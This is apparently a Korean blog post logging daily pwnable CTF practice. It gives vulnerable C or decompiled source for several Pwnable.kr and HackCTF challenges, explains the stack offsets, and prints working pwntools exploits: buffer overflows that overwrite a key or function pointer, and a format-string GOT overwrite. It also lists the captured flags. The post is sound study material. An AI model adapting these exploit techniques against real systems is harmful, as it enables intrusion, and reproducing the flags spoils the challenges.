<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="앞 전에 포너블을 공부를 조금하다가 다시 안 했는데 오늘부터 다시 하루마다 포너블 문제를 조금씩 풀어보려고 합니다.  PWN D+1 (2021.01.25) Pwnable.kr Challenge : BOF 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwnable Exploitation">
<meta property="og:url" content="http://example.com/2021/01/25/2021-01-25-pwn/index.html">
<meta property="og:site_name" content="Home">
<meta property="og:description" content="앞 전에 포너블을 공부를 조금하다가 다시 안 했는데 오늘부터 다시 하루마다 포너블 문제를 조금씩 풀어보려고 합니다.  PWN D+1 (2021.01.25) Pwnable.kr Challenge : BOF 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &amp;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true">
<meta property="article:published_time" content="2021-01-25T00:00:03.000Z">
<meta property="article:modified_time" content="2021-01-29T17:43:06.170Z">
<meta property="article:author" content="Jeongwon Jo">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/wjddnjs33/image2/blob/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Pwnable Exploitation</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/categories/">Category</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/01/30/2021-01-30-dctf/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2021/01/25/2021-01-25-npwn-note/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/01/25/2021-01-25-pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/01/25/2021-01-25-pwn/&text=Pwnable Exploitation"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/01/25/2021-01-25-pwn/&is_video=false&description=Pwnable Exploitation"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Pwnable Exploitation&body=Check out this article: http://example.com/2021/01/25/2021-01-25-pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/01/25/2021-01-25-pwn/&title=Pwnable Exploitation"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/01/25/2021-01-25-pwn/&name=Pwnable Exploitation&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/01/25/2021-01-25-pwn/&t=Pwnable Exploitation"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-1-2021-01-25"><span class="toc-number">1.</span> <span class="toc-text">PWN D+1 (2021.01.25)
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-2-2021-01-26"><span class="toc-number">2.</span> <span class="toc-text">PWN D+2 (2021.01.26)
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-3-2021-01-27"><span class="toc-number">3.</span> <span class="toc-text">PWN D+3 (2021.01.27)
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-4-2021-01-28"><span class="toc-number">4.</span> <span class="toc-text">PWN D+4 (2021.01.28)
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-D-5-2021-01-29"><span class="toc-number">5.</span> <span class="toc-text">PWN D+5 (2021.01.29)
</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Pwnable Exploitation
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Jeongwon Jo</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-01-25T00:00:03.000Z" itemprop="datePublished">2021-01-25</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Pwnable/">Pwnable</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><strong>앞 전에 포너블을 공부를 조금하다가 다시 안 했는데 오늘부터 다시 하루마다 포너블 문제를 조금씩 풀어보려고 합니다.</strong><br></p>
<hr>
<h2 id="PWN-D-1-2021-01-25"><a href="#PWN-D-1-2021-01-25" class="headerlink" title="PWN D+1 (2021.01.25)"></a>PWN D+1 (2021.01.25)<br></h2><hr>
<p>Pwnable.kr Challenge : BOF</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">        gets(overflowme);       <span class="comment">// smash me!</span></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>처음 풀어 볼 문제는 Pwnable.kr의 BOF라는 문제입니다. func 함수를 보면 key의 값이 <code>0xcafebabe</code>이면 system 함수를 호출하는 것을 볼 수 있습니다. BOF를 이용해서 key 값을 <code>0xcafebabe</code> 바꿔주면 될 거 같습니다.</strong><br></p>
<p><img src="https://github.com/wjddnjs33/image2/blob/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true"></p>
<p><strong>func 중간에 브레이크 포인트를 걸어 key의 주소를 확인해보면 13 + 4 = 52만큼 떨어져 있는 것을 볼 수 있습니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">52</span></span><br><span class="line">payload += p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : daddy, I just pwned a buFFer :)</p>
</blockquote>
<hr>
<p>HackCTF Challenge : Basic_BOF #1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0x4030201</span>;</span><br><span class="line">  fgets(&amp;s, <span class="number">45</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">0x4030201</span> &amp;&amp; v5 != <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou are on the right way!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/dash&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Shell closed! Bye.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>따로 .c 파일이 주어지지 않아 IDA를 이용해서 코드로 변환해보니, v5의 값이 <code>0xDEADBEEF</code>면 system 함수를 호출하는 것을 볼 수 있습니다. 이번 문제도 BOF를 이용해서 v5의 값을 <code>0xDEADBEEF</code>로 바꿔주면 될 거 같습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v5  &#x3D; 34h - Ch</span><br><span class="line">v5 &#x3D; 40</span><br></pre></td></tr></table></figure>
<p><strong>v5는 s와 40만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">52</span> - <span class="number">12</span>)</span><br><span class="line">payload += p32(<span class="number">0xDEADBEEF</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}</p>
</blockquote>
<hr>
<p>HackCTF Challenge : Basic_BOF #2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">void</span> (*v5)(<span class="keyword">void</span>); <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sup;</span><br><span class="line">  fgets(&amp;s, <span class="number">133</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(...)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/dash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// shell addr : 0x804849B</span></span><br></pre></td></tr></table></figure>
<p><strong>1번과 마찬가치로 IDA를 이용해서 코드로 변환해주었습니다. 코드를 보니 문자열 변수 s와 함수 포인터 v5를 정의하는 것을 볼 수 있습니다. 그리고 마지막에는 v5 함수를 호출하고 있습니다. BOF 취약점을 이용해서 v5 포인터 변수의 값으로 shell 함수의 주소를 넣어주면 v5 함수를 호출 할 때 shell 함수가 호출이 될 것 입니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v5 &#x3D; 8Ch - Ch</span><br><span class="line">*v5 &#x3D; 128</span><br></pre></td></tr></table></figure>
<p><strong>*v5는 s와 128만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">128</span></span><br><span class="line">payload += p32(<span class="number">0x804849B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : HackCTF{h3y_dud3_600d_f0r_y0u}</p>
</blockquote>
<hr>
<p>HackCTF Challenge : Basic_FSB</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vuln</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-808h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+400h] [ebp-408h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input : &quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;format, <span class="number">0x400</span>u, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EN)you have successfully modified the value :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aKr);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>IDA를 이용해서 코드로 변환을 해주었습니다. main 함수를 보면 vuln 함수를 호출하고 있고, vulln 함수를 보면 snprintf 함수에서 두 번째 매개변수로 서식 문자가 정의되어 있지 않아 FSB 취약점이 발생합니다. 그래서 FSB 취약점을 이용해서 printf 함수의 got를 flag 함수의 주소로 덮어주면 printf 함수가 실행될 때, flag 함수가 실행이 될 것 입니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@py:~&#x2F;pwn&#x2F;HackCTF&#x2F;B_F# .&#x2F;basic_fsb</span><br><span class="line">input : aaaa.%x.%x.%x.%x.%x</span><br><span class="line">aaaa.f7fc5c75.61616161.2e78252e.252e7825.78252e78</span><br><span class="line">root@py:~&#x2F;pwn&#x2F;HackCTF&#x2F;B_F#</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; gdb -q .&#x2F;basic_fsb</span><br><span class="line">gdb-peda$ x&#x2F;i 0x80483d0</span><br><span class="line">   0x80483d0 &lt;printf@plt&gt;:      jmp    DWORD PTR ds:0x804a00c</span><br><span class="line">gdb-peda$ p flag</span><br><span class="line">$2 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x80485b4 &lt;flag&gt;</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure>
<p><strong>바이너리 파일을 실행해서 오프셋을 확인해보니 두 번째 서식 문자에서 <code>aaaa</code>의 값이 출력되는 것을 볼 수 있고, printf got, flag 함수의 주소는 위와 같습니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3002</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">2</span>, &#123;<span class="number">0x804a00c</span>:<span class="number">0x80485b4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32 비트에서는 fmtstr_payload 함수를 이용해도 잘 되지만 64 비트에서는 거의 안 됨.</span></span><br><span class="line"><span class="comment"># 처음 풀 때 어려워 했는데 이해하고 다시 보니, webhacking.kr 1번 문제 느낌.</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : HackCTF{여보게_오늘_반찬은_포맷스트링이_어떠한가?}</p>
</blockquote>
<hr>
<p>PicoCTF Challenge : authenticate</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> authenticated = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>];</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(flag, <span class="keyword">sizeof</span>(flag), file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!authenticated) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sorry, you are not *authenticated*!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Access Granted.\n&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> buf[<span 